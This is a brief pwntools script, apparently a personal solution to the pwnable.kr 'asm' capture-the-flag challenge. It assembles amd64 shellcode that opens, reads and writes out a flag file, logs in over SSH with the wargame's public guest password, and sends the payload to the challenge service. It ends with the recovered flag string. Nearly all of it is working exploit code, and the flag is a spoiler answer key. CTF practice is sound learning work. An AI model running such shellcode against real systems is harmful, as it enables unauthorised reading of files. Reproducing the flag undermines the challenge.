#NEEDED HELP IN OPERATING FIRST TIME WITH pwntools

from pwn import *
context(arch='amd64', os='linux')  # need to specify this for compilation

name = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
shellc = asm(shellcraft.open(name, 0) +  # open file and returns descriptor
             shellcraft.read("rax", "rsp", 40) +  # write from fd (returned in rax) to a saved flag buffer (rsp 100% points to a buffer - the stack, and using rbp might overwrite important stuff)
             shellcraft.write(1, "rsp", 40) +  # write from saved flag buffer to stdout (rsp 100% points to a buffer - the stack, and using rbp might overwrite important stuff)
             shellcraft.exit(0))  # exit program
conn = ssh("asm", "pwnable.kr", password="guest", port=2222)  # ssh connection
shellcoms = conn.remote('0', 9026)  # nc 0(local) 9026(port)
print(shellcoms.recv())  # receive the explanations of challenge
shellcoms.send(shellc)  # send the shellcode when program is waiting for input
print(shellcoms.recv())  # receive output that should include the flag

flag: "Mak1ng_shelLcodE_i5_veRy_eaSy"